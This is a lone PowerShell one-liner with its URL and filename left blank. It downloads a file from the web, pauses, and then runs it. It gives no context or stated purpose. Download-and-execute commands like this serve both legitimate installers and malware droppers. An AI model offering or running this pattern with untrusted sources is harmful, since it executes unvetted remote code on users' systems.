```ps1
powershell -Command "$file=''; Invoke-WebRequest -Uri '' -OutFile $file; Start-Sleep -Seconds 2; Start-Process $file"
```
